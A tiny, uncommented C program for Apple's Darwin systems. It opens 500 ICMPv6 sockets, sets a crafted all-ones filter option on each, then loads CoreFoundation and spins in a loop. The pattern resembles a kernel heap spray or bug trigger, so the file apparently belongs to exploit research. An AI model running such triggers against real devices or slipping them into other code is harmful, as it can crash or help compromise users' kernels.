#include <sys/socket.h>
#include <dlfcn.h>
int main(void) {
    unsigned char f[32]; for(int i=0;i<32;i++) f[i]=0xFF;
    for(int i=0;i<500;i++){int d=socket(30,2,58);if(d>=0)setsockopt(d,58,18,f,32);}
    void*c=dlopen("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation",1);
    if(c){void(*r)(void)=dlsym(c,"CFRunLoopRun");if(r)r();}
    while(1){__asm__ volatile("yield");}
}
